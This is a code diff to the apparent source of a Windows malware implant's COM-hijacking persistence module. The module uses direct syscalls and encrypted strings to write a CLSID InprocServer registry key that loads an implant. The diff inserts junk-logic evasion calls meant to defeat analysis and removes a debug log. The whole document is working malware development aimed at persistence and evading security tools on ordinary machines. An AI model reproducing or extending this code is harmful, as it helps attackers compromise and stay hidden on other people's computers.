@@ -4,6 +4,7 @@
 #include "../utils/Obfuscator.h"
 #include "../utils/Logger.h"
 #include "../utils/Shared.h"
+#include "../evasion/JunkLogic.h"
 #include <vector>
 #include <sstream>
 
@@ -18,7 +19,7 @@ namespace {
 }
 
 bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
-    LOG_DEBUG("ComHijacker::Install started");
+    evasion::JunkLogic::GenerateEntropy();
 
     std::wstring sid = utils::GetCurrentUserSid();
     if (sid.empty()) return false;
@@ -29,6 +30,8 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
 
     if (ntOpenKeySsn == 0xFFFFFFFF || ntSetValueKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;
+
+    evasion::JunkLogic::PerformComplexMath();
 
     std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
     UNICODE_STRING uHkcu;
@@ -43,6 +46,8 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hHkcu, (UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
 
     if (!NT_SUCCESS(status)) return false;
+
+    evasion::JunkLogic::ScrambleMemory();
 
     std::wstring relativePath = utils::DecryptW(kClsidPathEnc, 23) + clsid + L"\\" + utils::DecryptW(kInprocEnc, 14);
     HANDLE hKey = NULL;
